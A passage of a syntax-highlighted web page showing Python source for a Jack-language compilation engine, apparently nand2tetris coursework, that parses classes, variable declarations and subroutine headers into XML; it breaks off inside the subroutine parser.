class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> JackTokenizer <span class="keyword">import</span> JackTokenizer,TOKEN_TYPE,KEYWORD_TYPE,tokentype,tokendict</span><br><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, unique</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CompilationEngine</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,infile)</span>:</span></span><br><span class="line">        <span class="comment"># read all source code string to the buffer</span></span><br><span class="line">        self.parser = JackTokenizer(infile)</span><br><span class="line">        outfile = infile[:infile.find(<span class="string">".jack"</span>)] + <span class="string">".xml"</span></span><br><span class="line">        self.out = open(outfile,<span class="string">"w"</span>)</span><br><span class="line">        self.depth = <span class="number">0</span></span><br><span class="line">        self.compileClass()</span><br><span class="line">        self.out.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lowerLevel</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.depth += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upperLevel</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.depth -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileOut</span><span class="params">(self,str)</span>:</span></span><br><span class="line">        self.out.write(<span class="string">"  "</span>*self.depth)</span><br><span class="line">        self.out.write(str)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileOutElement</span><span class="params">(self,tkType,tkStr)</span>:</span></span><br><span class="line">        self.out.write(<span class="string">"  "</span>*self.depth)</span><br><span class="line">        typeStr = <span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> tkType == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">            typeStr = <span class="string">"keyword"</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            typeStr = <span class="string">"symbol"</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            typeStr = <span class="string">"identifier"</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_INT_CONST:</span><br><span class="line">            typeStr = <span class="string">"integerConstant"</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_STRING_CONST:</span><br><span class="line">            typeStr = <span class="string">"stringConstant"</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_INVALID:</span><br><span class="line">            typeStr = <span class="string">"invalid"</span></span><br><span class="line">        self.out.write(<span class="string">"&lt;"</span> + typeStr + <span class="string">"&gt; "</span> + tkStr + <span class="string">" &lt;/"</span> + typeStr + <span class="string">"&gt;\n"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileClass</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;class&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse class</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD  <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"class"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid class define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse class name</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid class define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse symbol '&#123;' </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&#123;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid class define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#parse class val des</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">              (self.parser.keyWord() == <span class="string">"static"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"field"</span>):</span><br><span class="line">            self.compileClassVarDec()</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#parse class method</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">            (self.parser.keyWord() == <span class="string">"method"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"constructor"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"function"</span>):</span><br><span class="line">            self.compileSubroutine()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#parse symbol '&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&#125;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid class define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end of parse class</span></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/class&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>          </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileClassVarDec</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;classVarDec&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">          (self.parser.keyWord() == <span class="string">"static"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"field"</span>):</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse val type</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">or</span> \</span><br><span class="line">           self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse val name</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse the left val name</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">";"</span>):</span><br><span class="line">            <span class="comment"># parse symbol ','</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">","</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse val name</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse the end symbol  </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">";"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end of class var descrtion</span></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/classVarDec&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileSubroutine</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;subroutineDec&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD  <span class="keyword">and</span> \</span><br><span class="line">           (self.parser.keyWord() == <span class="string">"constructor"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"function"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"method"</span>):</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"invalid subroutine!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse type</span></span><br><span class="line">        <span class="keyword">if</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD  <span class="keyword">and</span> \</span><br><span class="line">           (self.parser.keyWord() == <span class="string">"int"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"char"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"void"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"boolean"</span>)) <span class="keyword">or</span> \</span><br><span class="line">            self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">           <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">           <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"invalid subroutine!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse subroutineName</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"invalid subroutine!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"invalid subroutine!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse param list</span></span><br><span class="line">        self.compileParameterList()</span><br><span 